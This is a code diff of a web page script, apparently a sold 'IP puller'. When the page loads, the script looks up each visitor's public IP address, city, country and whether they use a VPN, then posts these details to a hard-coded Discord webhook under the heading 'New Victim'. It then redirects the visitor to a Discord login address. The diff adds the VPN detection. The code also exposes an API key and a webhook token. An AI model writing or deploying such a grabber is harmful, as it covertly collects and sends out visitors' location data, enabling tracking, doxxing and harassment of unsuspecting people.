@@ -10,36 +10,52 @@
     function json(url) {
         return fetch(url).then(res => res.json());
     }
-    
+
     function getMyIP() {
         let apiKey = '3dc9adbe58e5e216.fff70c02d7f2504d629bef86fc31b7f18eef700cc36d644c5d30363885290381';
         let webhookURL = 'https://discord.com/api/webhooks/1308891035342213120/TbQOU164hVD4wWZ7kle5tqIXpS9_lU3P7fUXmlYw7fTBm5Av8Zki7-Cw9D4dZd530xvr';
 
-        json(`https://IPFLARE_API_KEY=y=${apiKey}`).then(data => {
-            
-            let message = {
-                embeds: [
-                    {
-                        title: "@everyone King von IP puller 😈",
-                        description: `** New Victim**\nIP: ||${data.ip}||\nCity: ${data.city}\nCountry: ${data.country_code}\nBY RUNTZ PURCHASE TODAY!`,
-                        image: {
-                            url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
-                        },
-                        color: 0x007BFF
-                    }
-                ]
-            };
-            fetch(webhookURL, {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify(message)
-            }).then(() => {
-                window.location.href = "https://discord.gg/login";
+        // Fetch the public IP address of the user
+        fetch('https://api.ipify.org?format=json')
+            .then(response => response.json())
+            .then(ipData => {
+                const ip = ipData.ip;
+                
+                // Check if the IP belongs to a VPN using ipinfo.io (or any other API)
+                fetch(`https://ipinfo.io/${ip}/json?token=YOUR_API_KEY`)
+                    .then(response => response.json())
+                    .then(ipInfo => {
+                        const isVpn = ipInfo.org && ipInfo.org.toLowerCase().includes("vpn");
+                        
+                        // If a VPN is detected, send a webhook with that information
+                        let message = {
+                            embeds: [
+                                {
+                                    title: "@everyone King von IP puller 😈",
+                                    description: `** New Victim**\nIP: ||${ip}||\nCity: ${ipInfo.city}\nCountry: ${ipInfo.country}\nVPN Detected: ${isVpn ? 'Yes' : 'No'}\nBY RUNTZ PURCHASE TODAY!`,
+                                    image: {
+                                        url: "https://www.rollingstone.com/wp-content/uploads/2022/02/king-von-posthumous-album.jpg"
+                                    },
+                                    color: 0x007BFF
+                                }
+                            ]
+                        };
+
+                        // Send the data to Discord webhook
+                        fetch(webhookURL, {
+                            method: 'POST',
+                            headers: {
+                                'Content-Type': 'application/json'
+                            },
+                            body: JSON.stringify(message)
+                        }).then(() => {
+                            window.location.href = "https://discord.gg/login";
+                        });
+                    });
             });
-        });
     }
+
+    // Call the function to get IP and check VPN
     getMyIP();
 
     </script>
